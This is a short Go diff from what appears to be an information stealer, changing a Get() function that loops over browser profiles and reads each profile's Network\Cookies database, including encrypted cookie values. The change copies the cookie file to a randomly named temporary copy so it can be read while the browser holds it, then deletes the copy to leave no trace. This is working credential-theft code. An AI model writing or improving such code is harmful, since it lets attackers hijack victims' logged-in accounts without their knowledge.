@@ -33,11 +33,14 @@ func Get() string {
 				continue
 			}
 			path = path + "\\" + profile
-			db, err := sql.Open("sqlite3", path+"\\Network\\Cookies")
+			copy_path := path + "\\Network\\Cookies" + util.RandomName()
+			util.CopyFileKDOT(path+"\\Network\\Cookies", copy_path)
+			db, err := sql.Open("sqlite3", copy_path)
 			if err != nil {
 				continue
 			}
 			defer db.Close()
+			defer os.Remove(copy_path)
 
 			row, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
 			if err != nil {
